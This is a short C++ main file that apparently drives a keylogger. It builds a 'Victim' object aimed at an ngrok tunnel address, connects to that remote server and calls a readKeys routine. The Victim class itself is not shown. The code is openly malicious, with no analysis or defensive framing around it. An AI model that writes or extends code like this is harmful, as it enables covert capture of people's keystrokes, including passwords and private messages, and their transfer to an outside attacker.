#include "Victim.h"

int main() {
	Victim* victim = new Victim("tcp://4.tcp.ngrok.io:18997");

	victim->connectToServer();
	victim->readKeys();

	return 0;
}   